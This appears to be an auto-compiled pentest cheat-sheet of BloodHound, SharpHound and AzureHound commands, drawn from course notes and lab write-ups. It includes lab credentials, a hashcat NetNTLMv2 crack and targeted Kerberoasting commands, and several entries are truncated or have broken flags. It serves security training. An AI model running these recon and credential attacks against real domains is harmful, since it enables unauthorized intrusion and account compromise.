# BloodHound / SharpHound

% bloodhound, sharphound, cpts

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - bloodhoundpy
#cat/RECON #cpts
Once we have domain credentials, we can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released

```
bloodhound-python -h
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - bloodhoundpy-2
#cat/RECON #cpts
Once we have domain credentials, we can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released

```
Python based ingestor for BloodHound
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - bloodhoundpy-3
#cat/RECON #cpts
As we can see the tool accepts various collection methods with the -c or --collectionmethod flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select all to gather as

```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - bloodhound
#cat/RECON #cpts
As discussed in the previous section, Bloodhound is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects. Both penetration testers and blu

```
SharpHound 1.0.3
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - bloodhound-2
#cat/RECON #cpts
As discussed in the previous section, Bloodhound is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects. Both penetration testers and blu

```
s, --searchforest (Default: false) Search all available domains in the forest
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - bloodhound-3
#cat/RECON #cpts
We'll start by running the SharpHound.exe collector from the MS01 attack host.

```
2022-04-18T13:58:22.1163680-07:00 | INFORMATION | Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - running-bloodhound-python-against-inlanefreightlocal
#cat/RECON #cpts
Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - running-bloodhound-python-against-freightlogisticslocal
#cat/RECON #cpts
Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - submit-the-contents-of-the-cflagtxt-file-on-ms01
#cat/RECON #cpts
Students need to run `BloodHound` to survey/scan the domain:

```
bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - submit-the-contents-of-the-cflagtxt-file-on-ms01-2
#cat/RECON #cpts
```
└──╼ $ bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - using-bloodhound-determine-how-many-kerberoastable-accounts-exist-with
#cat/RECON #cpts
Students first need to use `xfreerdp` to connect to the Windows spawned target machine, using the credentials `htb-student:Academy_student_AD!`:

```
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - using-bloodhound-determine-how-many-kerberoastable-accounts-exist-with-2
#cat/RECON #cpts
```
shell-session
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - using-bloodhound-determine-how-many-kerberoastable-accounts-exist-with-3
#cat/RECON #cpts
When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Ad

```
cd C:\Tools\
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - using-bloodhound-determine-how-many-kerberoastable-accounts-exist-with-4
#cat/RECON #cpts
Students then need to run `SharpHound` to collect data, which will be saved inside a ZIP file for the later use of it in `BloodHound`:

```
.\SharpHound.exe
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - using-bloodhound-determine-how-many-kerberoastable-accounts-exist-with-5
#cat/RECON #cpts
```
2022-06-19T07:09:03.9151760-07:00 | INFORMATION | Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - using-bloodhound-determine-how-many-kerberoastable-accounts-exist-with-6
#cat/RECON #cpts
Students then need to navigate the directory where `BloodHound` is and run it:

```
cd .\BloodHound-GUI\
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - using-bloodhound-determine-how-many-kerberoastable-accounts-exist-with-7
#cat/RECON #cpts
Students then need to navigate the directory where `BloodHound` is and run it:

```
.\BloodHound.exe
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - what-other-user-in-the-domain-has-canpsremote-rights-to-a-host
#cat/RECON #cpts
```
2022-06-20T07:32:05.9292877-07:00 | INFORMATION | Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - azurehound
#cat/RECON #cpts
```
JWT=$(az account get-access-token --resource https://graph.microsoft.com | jq -r .accessToken)
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - azurehound-2
#cat/RECON #cpts
```
./azurehound list --jwt "$JWT" -o "azurehound-ogf.json"
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - azurehound-3
#cat/RECON #cpts
```
azurehound list -u "NAME" -p "WORD" -t "$TENANT" -o "mytenant.json"
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - fluffy
#cat/RECON #cpts
extrait du PDF Joplin: fluffy

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt P.AGILA::FLUFFY:208d2c2f1ea8dab7:eda98e265a7a054a8ef2812f9fbb8fe6:000000000000 :prometheusx-303 Foothold Using these credentials, the Active Directory environment should be enumerated with Bloodhound . Locally, we should start the neo4j service and then upload the data to Bloodhound . Let's search for the p.agila in the Bloodhound search bar and mark that user as owned since we have credentials for that user. To view this user's object controls, we navigate to Node Info -> Outbound Object Control -> Transitive Object Con
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - fluffy-2
#cat/RECON #cpts
extrait du PDF Joplin: fluffy

```
bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -dc 'dc01.fluffy.htb' -c all -ns 10.10.11.69
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - tombwatcher
#cat/RECON #cpts
extrait du PDF Joplin: tombwatcher

```
bloodhound-python -d tombwatcher.htb -dc dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -c All -ns 10.129.11.1 --dns-tcp --zip
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - tombwatcher-2
#cat/RECON #cpts
extrait du PDF Joplin: tombwatcher

```
python3 /opt/tools/targetedKerberoast/targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --request-user alfred --dc-ip 10.129.11.1
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - voleur
#cat/RECON #cpts
extrait du PDF Joplin: voleur

```
bloodhound-python -u 'ryan.naylor' -d 'voleur.htb' -p 'HollowOct31Nyt' -c all --zip -ns 10.10.11.76 --dns-tcp
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - voleur-2
#cat/RECON #cpts
extrait du PDF Joplin: voleur

```
python3 /home/fury/tools/targetedKerberoast/targetedKerberoast.py -d voleur.htb --dc- host DC -u
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - redelegate
#cat/RECON #cpts
extrait du PDF Joplin: redelegate

```
bloodhound.py -u 'marie.curie' -p 'Fall2024!' -d redelegate.vl -dc dc.redelegate.vl -- zip -c All -ns 10.129.234.50 --disable-autogc
```

## BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - BloodHound / SharpHound - analysis
#cat/RECON #cpts
extrait du PDF Joplin: analysis

```
whoami analysis \njdoe bloodhound-python -c All -d analysis.htb -u jdoe -p '7y4Z4^*y9Zzj' -ns 10.129.230.179 -- zip
```

